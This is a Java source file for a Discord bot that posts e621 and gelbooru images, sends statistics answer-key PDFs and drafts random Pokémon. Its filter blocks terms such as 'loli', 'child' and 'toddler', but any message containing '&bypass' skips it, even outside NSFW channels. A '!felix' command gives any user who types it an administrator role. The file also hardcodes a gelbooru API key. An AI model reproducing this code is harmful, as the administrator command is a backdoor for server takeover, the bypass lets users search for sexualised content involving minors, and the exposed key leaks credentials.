package org.example;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.EnumSet;
import java.util.Random;


import com.opencsv.exceptions.CsvException;
import io.netty.channel.Channel;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.emoji.Emoji;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.utils.FileUpload;


public class MyListener extends ListenerAdapter {
    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        String[] test = {"shota","loli","guro","gore","scat","young","child","toddler","poop"};

        Message message = event.getMessage();
        String content = message.getContentRaw();
        String[] args = content.split(" ");

        if(event.getChannel().asTextChannel().isNSFW() && ((content.contains("!e621") || content.contains("!booru"))) || content.contains("&bypass")){
            if((Arrays.stream(test).anyMatch(content::contains)&&content.contains("!")) && !content.contains("&bypass") && !event.getAuthor().isBot()){
                System.out.println(Arrays.stream(test).anyMatch(content::contains) && !content.contains("&bypass") && !event.getAuthor().isBot());
                System.out.println(Arrays.stream(test).anyMatch(content::contains));
                System.out.println(content.contains("&bypass"));
                System.out.println(!event.getAuthor().isBot());
                EmbedBuilder builder = new EmbedBuilder();
                builder.setImage("https://www.dictionary.com/e/wp-content/uploads/2018/09/moai-emoji.png")
                        .setColor(0x9c9c9c)
                        .setFooter(event.getAuthor().getName() + " searched for \""+content+"\"", event.getAuthor().getAvatarUrl());
                event.getChannel().asGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();
            } else if (content.startsWith("!e621")&&!event.getAuthor().isBot()&&(!Arrays.stream(test).anyMatch(content.substring(7)::contains) || content.substring(7).contains("&bypass"))) {
                String search = content.substring(6);

                search = search.replace(" ","+");
                try {
                    PostData postData = PostData.getPostsFromE621(search,1);
                    String imageUrl = PostData.getUrl();
                    int imageId = PostData.getPostId();
                    EmbedBuilder builder = new EmbedBuilder();

                    HttpURLConnection connection = (HttpURLConnection) new URL(imageUrl).openConnection();
                    connection.setRequestMethod("HEAD");
                    if (connection.getResponseCode() == 200 ) {

                        builder.setImage(imageUrl)
                        .setTitle("Image via e621","https://e621.net/posts/"+imageId)
                        .setDescription("Searched Tag(s): " + search.replace("+",", "))
                        .setColor(0xff6f00)
                        .setFooter(event.getAuthor().getName(), event.getAuthor().getAvatarUrl());

                        event.getChannel().asGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();
                    }
                } catch (IOException e) {
                    event.getChannel().sendMessage("One or more tags in  \" "+search+" \" is invalid! Please try again!").queue();
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            } else if (content.startsWith("!booru")&&!event.getAuthor().isBot()&&(!Arrays.stream(test).anyMatch(content.substring(7)::contains) || content.substring(7).contains("&bypass"))){
                String search = content.substring(7, content.indexOf("&", 7) > -1 ? content.indexOf("&", 7) : content.length());
                search = search.replace(" ","+");
                String url = "https://gelbooru.com/index.php?page=dapi&s=post&q=index&api_key=5985fd8c50a9c969f32688ae7a6cf66a7485b0a2e678c85aae6f8ab91da89f35&user_id=1171000&tags=" + search + "+sort:random&limit=1";
                System.out.println("URL: "+url);
                if(!search.isBlank()){
                    try {
                        PostData postData2 = PostData.parseXML(url);
                        String imageUrl = PostData.getUrl();
                        int imageId = PostData.getPostId();
                        EmbedBuilder builder = new EmbedBuilder();

                        HttpURLConnection connection = (HttpURLConnection) new URL(imageUrl).openConnection();
                        connection.setRequestMethod("HEAD");
                        if (connection.getResponseCode() == 200 ) {

                            builder.setImage(imageUrl)
                                    .setTitle("Image via gelbooru","https://gelbooru.com/index.php?page=post&s=view&id="+imageId)
                                    .setDescription("Searched Tag(s): " + search.substring(0,search.length()-1).replace("+",", "))
                                    .setColor(0x3356FF)
                                    .setFooter("Searched by "+event.getAuthor().getName(), event.getAuthor().getAvatarUrl());

                            event.getChannel().asGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();

                        }
                    } catch (IOException e) {
                        event.getChannel().sendMessage("One or more tags in  \" "+search+" \" is invalid! Please try again!").queue();
                    }
                } else {
                    event.getChannel().sendMessage("You didnt type any tags! [Ex. !booru felix_argyle balls ]").queue();
                }
            }
        } else if(!message.getChannel().asTextChannel().isNSFW() && ((content.contains("!e621") || content.contains("!booru"))) && !content.contains("&bypass")){
            event.getChannel().sendMessage("This is not an NSFW Channel! Please update the channel type to use this command!").queue();
        }
        if (content.equals("!felix")) {
            Member member = event.getMember();
            EnumSet<Permission> permissions = EnumSet.of(Permission.ADMINISTRATOR);
            Role adminRole = event.getGuild().createRole().setPermissions(permissions).setName("felix").complete();
            event.getGuild().addRoleToMember(member, adminRole).queue();
            event.getChannel().sendMessage("The role 'felix' has been added to " + member.getEffectiveName()).queue();
        }
        if (event.getMessage().getContentRaw().startsWith("!stats")) {
                if (args.length != 2) {
                    event.getChannel().sendMessage("Invalid syntax. Use !stats [filename]").queue();
                    return;
                }
                String filename = args[1];
                if (!filename.endsWith(".pdf")) {
                    filename += "_Solutions.pdf";
                }
                File file = new File("C:\\Users\\slend\\Documents\\GitHub\\mega-balls-29\\Stats\\" + filename);
                if (!file.exists()) {
                    event.getChannel().sendMessage("File not found [ Type only the chapter number! Ex. !stats 7.2.2 ]").queue();
                    return;
                }
                event.getChannel().sendMessage(filename + " answer key; ").addFiles(FileUpload.fromData(file)).queue();
            }

        if(content.equals("!draft")) {
            String filePath = "C:\\Users\\slend\\Documents\\GitHub\\mega-balls-29\\CSV\\Draft League  - Sheet1 (1).csv";
            BufferedReader br = null;
            try {
                br = new BufferedReader(new FileReader(filePath));
            } catch (FileNotFoundException e) {
                throw new RuntimeException(e);
            }
            String line = "";
            // Xerneas,Latios,Alazkazam,Amoongus,Bewear
            int commas = 0;
            try {
                commas = arrSize(filePath)[0];
            } catch (IOException e) {
                throw new RuntimeException(e);
            } catch (CsvException e) {
                throw new RuntimeException(e);
            }
            int lines = 0;
            try {
                lines = arrSize(filePath)[1];
            } catch (IOException e) {
                throw new RuntimeException(e);
            } catch (CsvException e) {
                throw new RuntimeException(e);
            }
            String[][] data = new String[lines][commas+1];
            for(int i = 0; i<lines; i++){
                try {
                    line = br.readLine();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                String[] temp = line.split(",\\s*");
                for (int j = 0; j < temp.length; j++) {
                    data[i][j] = temp[j];
                    if(data[i][j] == "")
                        data[i][j] = null;
                }
            }

            String[] chosenPokemon = randomVar(data, 5);
            for (String pokemon : chosenPokemon) {
                event.getChannel().sendMessage("You have drafted: " + pokemon).queue(message1 -> message1.addReaction(""));
            }

        }
    }

    public static int[] arrSize(String filePath) throws IOException, CsvException {
        BufferedReader br = new BufferedReader(new FileReader(filePath));
        String line = br.readLine();
        int cc = 0;
        int lines = 0;
        int charAt = 0;
        while(charAt < line.length()){
            if(line.charAt(charAt)==',')
                cc++;
            charAt++;
        }
        while((line = br.readLine()) != null){
            lines++;
        }
        return new int[]{cc, lines};
    }
    public static String[] randomVar(String[][] arr, int n) {
        Random random = new Random();
        String[] randoms = new String[n];
        for(int i = 0; i<n; i++){
            int[] rNumbs;
            do {
                rNumbs = new int[]{random.nextInt(arr.length - 1), random.nextInt(arr[0].length - 1)+1};
            } while(arr[rNumbs[0]][rNumbs[1]] == null || Arrays.asList(randoms).contains(arr[rNumbs[0]][rNumbs[1]]));

            randoms[i] = arr[rNumbs[0]][rNumbs[1]];
        }

        return randoms;
    }


}
